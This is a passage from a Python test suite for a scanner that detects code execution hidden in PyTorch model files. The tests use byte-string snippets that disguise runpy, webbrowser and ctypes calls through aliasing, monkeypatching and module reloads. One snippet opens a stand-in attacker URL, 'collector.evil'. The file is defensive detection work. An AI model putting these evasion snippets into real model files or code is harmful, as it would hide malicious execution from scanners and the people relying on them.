            b"import runpy as rp\ncaptured = rp.run_path\nrelay = captured\nrp.run_path = print\nrelay('payload.py')\n"
        )

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_annotation_only_preserves_runpy_capture(self) -> None:
        detector = JITScriptDetector()
        data = b"import runpy as rp\nrunner = rp.run_path\nrunner: object\nrp.run_path = print\nrunner('payload.py')\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "data",
        [
            b"import runpy as rp\nrp = object()\nrunner = rp.run_path\nrunner('safe')\n",
            b"import runpy as rp\nrunner = rp.run_path\ndel runner\nrunner('safe')\n",
        ],
    )
    def test_scan_model_ignores_inactive_runpy_captures_after_rebinding(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_nested_print_parameter_does_not_shadow_module_builtin(self) -> None:
        source = "import runpy as rp\ndef helper(print):\n    pass\nrp.run_path = print\nrp.run_path('safe')\n"

        assert not jit_script_module._compact_snippet_has_shadowed_print(source)
        assert jit_script_module._compact_snippet_runpy_print_overwrite_calls(source) == {("runpy.run_path", "S108")}

    def test_scan_model_preserves_safe_runpy_overwrite_before_print_shadow(self) -> None:
        source = b"import runpy as rp\nrp.run_path = print\nprint = eval\nrp.run_path('safe')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "print_shadow",
        [
            b"globals()['print'] = eval\n",
            b"namespace = globals()\nnamespace['print'] = eval\n",
            b"import builtins\nbuiltins.__dict__.update(print=eval)\n",
        ],
    )
    def test_scan_model_preserves_safe_runpy_overwrite_before_mapping_print_shadow(
        self,
        print_shadow: bytes,
    ) -> None:
        source = b"import runpy as rp\nrp.run_path = print\n" + print_shadow + b"rp.run_path('safe')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_rejects_runpy_overwrite_after_print_shadow(self) -> None:
        source = b"import runpy as rp\nprint = eval\nrp.run_path = print\nrp.run_path('payload.py')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
                b"import ctypes, webbrowser\nctypes.open = print\nwebbrowser.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes, webbrowser\nwebbrowser.CDLL = print\nctypes.CDLL('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser\nwebbrowser.open_new = print\nwebbrowser.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\nc.PyDLL = print\nc.CDLL('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n__builtins__.setattr = lambda *args: None\n"
                b"setattr(c, 'CDLL', print)\nc.CDLL('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nactual = c\n__builtins__.setattr = lambda *args: None\n"
                b"setattr(c, 'CDLL', print)\nactual.CDLL('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\nactual = wb\n(wb,) = (object(),)\n"
                b"wb.open = print\nactual.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nactual = wb\nwith manager() as wb:\n    pass\n"
                b"wb.open = print\nactual.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nactual = wb\ntry:\n    1 / 0\n"
                b"except ZeroDivisionError as wb:\n    wb.open = print\n"
                b"actual.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nactual = wb\nif enabled:\n    wb = object()\n"
                b"wb.open = print\nactual.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nactual = wb\nfor wb in values:\n    pass\n"
                b"wb.open = print\nactual.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nactual = wb\nmatch value:\n    case wb:\n        pass\n"
                b"wb.open = print\nactual.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\nm = __builtins__\n"
                b"m.update(setattr=lambda *args: None)\nsetattr(c, 'CDLL', print)\nc.CDLL('payload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_keeps_typed_call_after_other_owner_safe_overwrite(
        self,
        source: bytes,
        expected_pattern: str,
    ) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        "binding",
        [
            b"with manager() as other:\n    pass\n",
            b"try:\n    1 / 0\nexcept ZeroDivisionError as other:\n    pass\n",
            b"if enabled:\n    other = object()\n",
            b"for other in values:\n    pass\n",
            b"match value:\n    case other:\n        pass\n",
            b"if enabled:\n    def helper():\n        wb = object()\n",
            b"if enabled:\n    [wb for wb in values]\n",
        ],
    )
    def test_scan_model_keeps_typed_safe_overwrite_after_unrelated_binding(
        self,
        binding: bytes,
    ) -> None:
        source = b"import webbrowser as wb\nactual = wb\n" + binding + b"wb.open = print\nactual.open('safe')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_extract_python_code_scopes_suppressions_to_each_candidate(self) -> None:
        detector = JITScriptDetector()
        safe = b"import webbrowser as wb\nwb.open = print\nwb.open('safe')\n"
        dangerous = b"import webbrowser as wb\nwb.open('https://example.invalid')\n"
        dangerous_start = len(safe) + 1
        data = safe + b"\x00" + dangerous
        candidates: list[jit_script_module._EmbeddedPythonCandidate] = [
            (safe, (0, len(safe)), ((0, len(safe)),)),
            (
                dangerous,
                (dangerous_start, dangerous_start + len(dangerous)),
                ((dangerous_start, dangerous_start + len(dangerous)),),
            ),
        ]

        findings = detector._extract_and_check_python_code(
            data,
            "TorchScript",
            "payload.py",
            prioritized_snippets=candidates,
        )

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
                b"import webbrowser as wb\nmapping = wb.__dict__\nmapping = {}\n"
                b"mapping.update(open=print)\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\nmapping = c.__dict__\nmapping = {}\n"
                b"mapping.update(CDLL=print)\nc.CDLL('payload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_keeps_typed_call_after_mapping_alias_reassignment(
        self,
        source: bytes,
        expected_pattern: str,
    ) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    def test_scan_model_keeps_runpy_call_after_module_alias_reassignment(self) -> None:
        detector = JITScriptDetector()
        data = b"import runpy as rp\nactual = rp\nrp = object()\nrp.run_path = print\nactual.run_path('payload.py')\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_preserves_safe_runpy_alias_after_other_alias_reassignment(self) -> None:
        detector = JITScriptDetector()
        data = b"import runpy as rp\nactual = rp\nactual.run_path = print\nrp = object()\nactual.run_path('safe')\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_keeps_runpy_call_after_possible_alias_reassignment(self) -> None:
        detector = JITScriptDetector()
        data = (
            b"import runpy\nimport runpy as rp\nif enabled:\n    rp = object()\n"
            b"rp.run_path = print\nrunpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_keeps_runpy_call_after_import_context_alias_reassignment(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        data = (
            b"import runpy\nimport runpy as rp\nrp = object()\n"
            + padding
            + b"rp.run_path = print\nrunpy.run_path('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
                b"import webbrowser\nwebbrowser.open('https://example.invalid')\nwebbrowser.open = print\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes\nctypes.CDLL('payload.so')\nctypes.CDLL = print\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_keeps_typed_call_before_safe_overwrite(
        self,
        source: bytes,
        expected_pattern: str,
    ) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
                b"import runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
                b"updates = {'run_path': original}\nrp.__dict__.update(updates)\nrp.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
                b"rp.__dict__.update({**{}, 'run_path': original})\nrp.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
                b"updates = {'open': original}\nwb.__dict__.update(updates)\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
        ],
    )
    def test_scan_model_keeps_call_after_unproven_mapping_update(
        self,
        source: bytes,
        expected_pattern: str,
    ) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    def test_scan_model_preserves_safe_runpy_member_after_trailing_static_update(self) -> None:
        detector = JITScriptDetector()
        data = b"import runpy as rp\nupdates = {}\nrp.__dict__.update(updates, run_path=print)\nrp.run_path('safe')\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_ignores_restored_runpy_member_without_call(self) -> None:
        detector = JITScriptDetector()
        data = b"import runpy\noriginal = runpy.run_path\nrunpy.run_path = print\nrunpy.run_path = original\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_ignores_stale_runpy_mapping_alias_reassignment(self) -> None:
        detector = JITScriptDetector()
        data = (
            b"import runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
            b"namespace = rp.__dict__\nnamespace = {}\nnamespace.update(run_path=original)\nrp.run_path('safe')\n"
        )

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
                b"import runpy\nrunpy.run_path = print\nimport sys\n"
                b"del sys.modules['runpy']\nimport runpy\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser\nwebbrowser.open = print\nimport sys\n"
                b"del sys.modules['webbrowser']\nimport webbrowser\nwebbrowser.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy, sys\nrunpy.run_path = print\n"
                b"sys.modules.pop('runpy')\nimport runpy\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser, sys\nwebbrowser.open = print\n"
                b"sys.modules.pop('webbrowser')\nimport webbrowser\n"
                b"webbrowser.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy, sys\ns = sys\nrunpy.run_path = print\n"
                b"s.modules.pop('runpy')\nimport runpy\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy, sys\nmodules = sys.modules\nrunpy.run_path = print\n"
                b"modules.pop('runpy')\nimport runpy\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy, sys\nevict = sys.modules.pop\nrunpy.run_path = print\n"
                b"evict('runpy')\nimport runpy\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy\nfrom sys import modules\nrunpy.run_path = print\n"
                b"modules.pop('runpy')\nimport runpy\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser, sys\nwebbrowser.open = print\n"
                b"sys.modules.clear()\nimport webbrowser\nwebbrowser.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy, sys\nrunpy.run_path = print\n"
                b"((s := sys), s.modules.pop(*('runpy',)))\nimport runpy\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy, importlib\nrunpy.run_path = print\n"
                b"importlib.reload(runpy)\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser, importlib\nwebbrowser.open = print\n"
                b"importlib.reload(webbrowser)\nwebbrowser.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
        ],
    )
    def test_scan_model_keeps_call_after_module_reimport_or_reload(
        self,
        source: bytes,
        expected_pattern: str,
    ) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            "import webbrowser as wb\nmapping = wb.__dict__\nmapping = {}\nmapping.update(open=print)\n",
            "import webbrowser as wb\nmapping: dict = wb.__dict__\nmapping: dict = {}\nmapping.update(open=print)\n",
            "import webbrowser as wb\n(mapping,) = (wb.__dict__,)\n(mapping,) = ({},)\nmapping.update(open=print)\n",
            "import webbrowser as wb\nmapping = wb.__dict__\n(mapping := {}) or mapping.update(open=print)\n",
        ],
    )
    def test_typed_safe_overwrite_rejects_rebound_mapping_alias(self, source: str) -> None:
        assert jit_script_module._compact_snippet_typed_print_overwrite_calls(source) == set()

    def test_typed_safe_overwrite_preserves_forwarded_mapping_alias(self) -> None:
        source = (
            "import webbrowser as wb\nmapping = wb.__dict__\nalias = mapping\nmapping = {}\nalias.update(open=print)\n"
        )

        assert jit_script_module._compact_snippet_typed_print_overwrite_calls(source) == {("webbrowser.open", "S109")}

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
                b"import runpy as rp\nrp.__dict__.update(rp.run_path('payload.py') or {}, run_path=print)\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\nwb.__dict__.update(wb.open('https://example.invalid') or {}, open=print)\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy as rp\nenabled and rp.__dict__.update(run_path=print)\nrp.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\nenabled and wb.__dict__.update(open=print)\n"
                b"wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy as rp\nenabled and rp.__dict__.__setitem__('run_path', print)\n"
                b"rp.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\nenabled and dict.update(wb.__dict__, open=print)\n"
                b"wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nenabled and dict.__setitem__(wb.__dict__, 'open', print)\n"
                b"wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nenabled and wb.__dict__.__setitem__('open', print)\n"
                b"wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nenabled and setattr(wb, 'open', print)\n"
                b"wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy, types\nrp = runpy\n(rp := types.SimpleNamespace())\n"
                b"rp.run_path = print\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy, types\nrp = runpy\nfor _ in [1, 2]:\n    rp = types\n"
                b"rp.run_path = print\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser\nimport webbrowser as wb\nimport types as wb\n"
                b"wb.open = print\nwebbrowser.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
                b"mapping = rp.__dict__\nupdates = {'run_path': original}\n"
                b"mapping |= updates\nrp.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
                b"mapping = wb.__dict__\nupdates = {'open': original}\n"
                b"mapping |= updates\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy\nfrom importlib import reload as refresh\nrunpy.run_path = print\n"
                b"refresh(runpy)\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy\nfrom importlib import reload as refresh\nrunpy.run_path = print\n"
                b"refresh = (refresh(runpy), print)[1]\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy\nfrom importlib import reload as refresh\nrunpy.run_path = print\n"
                b"refresh, callback = print, refresh\ncallback(runpy)\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\nfrom importlib import reload as refresh\nwb.open = print\n"
                b"refresh = (refresh(wb), print)[1]\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy\nother = runpy\nfrom importlib import reload as refresh\n"
                b"runpy.run_path = print\nrunpy = (refresh(runpy), print)[1]\n"
                b"other.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\nother = wb\nfrom importlib import reload as refresh\n"
                b"wb.open = print\nwb = (refresh(wb), print)[1]\n"
                b"other.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy, importlib\nrefresh = importlib\nrunpy.run_path = print\n"
                b"refresh.reload(runpy)\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy, importlib\nrefresh = print\nrunpy.run_path = print\n"
                b"((refresh := importlib.reload), refresh(runpy))\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb, importlib\nrefresh = print\nwb.open = print\n"
                b"((refresh := importlib.reload), refresh(wb))\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy, importlib\nrunpy.run_path = print\n"
                b"((loader := importlib), loader.reload(*(runpy,)))\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb, importlib\nwb.open = print\n"
                b"importlib.reload(module=wb)\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy, importlib\nrunpy.run_path = print\n"
                b"importlib.reload(**{'module': runpy})\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy, importlib\nrefresh = importlib.reload\nrunpy.run_path = print\n"
                b"(False and (refresh := print), refresh(runpy))\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy, importlib\nrefresh = importlib.reload\nrunpy.run_path = print\n"
                b"(lambda: (refresh := print))\nrefresh(runpy)\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy, importlib\nrefresh = importlib.reload\nrunpy.run_path = print\n"
                b"[(refresh := print) for _ in []]\nrefresh(runpy)\nrunpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb, importlib\nrefresh = importlib.reload\nwb.open = print\n"
                b"[(refresh := print) for _ in [1] if False]\n"
                b"refresh(wb)\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nalias = wb\n"
                b"alias.open('https://example.invalid') or (alias := object())\nwb.open = print\n",
                "Web browser launch detected",
            ),
        ],
    )
    def test_scan_model_keeps_call_across_ordered_state_replay_edges(
        self,
        source: bytes,
        expected_pattern: str,
    ) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("future_import", "should_detect"),
        [
            (b"from __future__ import annotations\n", True),
            (b"", False),
        ],
    )
    def test_scan_model_respects_deferred_annotation_side_effects(
        self,
        future_import: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            future_import
            + b"import webbrowser as wb\n"
            + b"marker: wb.__dict__.update(open=print)\n"
            + b"wb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert detected is should_detect

    def test_runpy_replay_applies_eager_annotation_side_effects(self) -> None:
        source = (
            "import runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
            "def payload(value: setattr(rp, 'run_path', original)):\n    pass\n"
            "((rp).run_path)('payload.py')\n"
        )

        suppressed = jit_script_module._compact_snippet_runpy_print_overwrite_calls(source)

        assert ("runpy.run_path", "S108") not in suppressed

    def test_runpy_replay_preserves_safe_state_for_deferred_annotation(self) -> None:
        source = (
            "from __future__ import annotations\nimport runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
            "def payload(value: setattr(rp, 'run_path', original)):\n    pass\n"
            "((rp).run_path)('safe')\n"
        )

        suppressed = jit_script_module._compact_snippet_runpy_print_overwrite_calls(source)

        assert ("runpy.run_path", "S108") in suppressed

    def test_scan_model_invalidates_safe_member_in_uncertain_branch(self) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"if flag:\n    wb.open = original\n"
            b"((wb).open)('https://collector.evil')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("restored_value", "should_detect"),
        [
            (b"original", True),
            (b"print", False),
        ],
    )
    @pytest.mark.parametrize("target", [b"(wb.open,)", b"[wb.open]"])
    def test_scan_model_tracks_destructured_typed_member_assignment(
        self,
        target: bytes,
        restored_value: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            + target
            + b" = ("
            + restored_value
            + b",)\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert detected is should_detect

    @pytest.mark.parametrize(
        ("mapping_setup", "target"),
        [
            (b"", b"wb.__dict__['open']"),
            (b"mapping = wb.__dict__\n", b"mapping['open']"),
        ],
    )
    @pytest.mark.parametrize(
        ("restored_value", "should_detect"),
        [
            (b"original", True),
            (b"print", False),
        ],
    )
    def test_scan_model_tracks_typed_member_mapping_assignment(
        self,
        mapping_setup: bytes,
        target: bytes,
        restored_value: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            + mapping_setup
            + target
            + b" = "
            + restored_value
            + b"\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert detected is should_detect

    def test_scan_model_ignores_unrelated_mapping_assignment_after_typed_safe_overwrite(self) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"other = {}\nother['open'] = original\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_typed_call_imported_before_safe_overwrite(self) -> None:
        source = (
            b"from webbrowser import open as opener\n"
            b"import webbrowser as wb\n"
            b"wb.open = print\n"
            b"opener('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_suppresses_typed_call_imported_after_safe_overwrite(self) -> None:
        source = b"import webbrowser as wb\nwb.open = print\nfrom webbrowser import open as opener\nopener('safe')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize("safe_print", [b"builtins.print", b"bi.print"])
    def test_scan_model_accepts_builtin_print_typed_overwrite(self, safe_print: bytes) -> None:
        source = (
            b"import builtins\nimport builtins as bi\nimport webbrowser as wb\nwb.open = "
            + safe_print
            + b"\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_rejects_print_attribute_on_rebound_builtins_name(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"class Holder:\n    print = input\n"
            b"builtins = Holder\nwb.open = builtins.print\n"
            b"wb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_rejects_lazy_consumer_after_same_expression_builtins_rebind(self) -> None:
        source = (
            b"import builtins as bi\nimport ctypes as c\n"
            b"class Lazy:\n    @staticmethod\n    def list(values):\n        return values\n"
            b"((bi := Lazy), bi.list(c.__dict__.update(CDLL=print) for _ in [0]))\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_keeps_alias_when_eager_generator_inner_iterable_is_empty(self) -> None:
        source = (
            b"import builtins as bi\nimport ctypes as c\nloader = c.CDLL\n"
            b"bi.list((loader := print) for _ in [0] for __ in [])\n"
            b"loader('libpayload.so')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("initial_state", "replacement", "should_detect"),
        [
            (b"", b"print", False),
            (b"original = wb.open\nwb.open = print\n", b"original", True),
        ],
    )
    def test_prefix_typed_member_aliases_replay_eager_nested_generator_iterable_mutation(
        self,
        initial_state: bytes,
        replacement: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            b"import webbrowser as wb\n"
            + initial_state
            + b"list(x for _ in [0] for __ in (setattr(wb, 'open', "
            + replacement
            + b"),))\nalias = wb.open\n"
        )

        aliases = jit_script_module._unsafe_typed_member_aliases(
            source,
            jit_script_module._typed_import_aliases(source),
        )

        assert ("alias" in aliases) is should_detect

    def test_scan_model_replays_dangerous_eager_nested_generator_iterable_mutation(self) -> None:
        prefix = (
            b"\x00\xffimport webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"list(x for _ in [0] for __ in (setattr(wb, 'open', original),))\n"
            b"alias = wb.open\n"
        )
        call_padding = b"# gap\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# gap\n") + 8
        )
        source = prefix + call_padding + b"alias('https://example.invalid')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_suppresses_safe_eager_nested_generator_iterable_mutation(self) -> None:
        source = (
            b"import webbrowser as wb\nlist(x for _ in [0] for __ in (setattr(wb, 'open', print),))\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_accepts_builtin_print_after_statically_empty_generator_walrus(self) -> None:
        source = b"import ctypes as c\nunused = ((print := eval) for _ in [])\nc.CDLL = print\nc.CDLL('safe')\n"

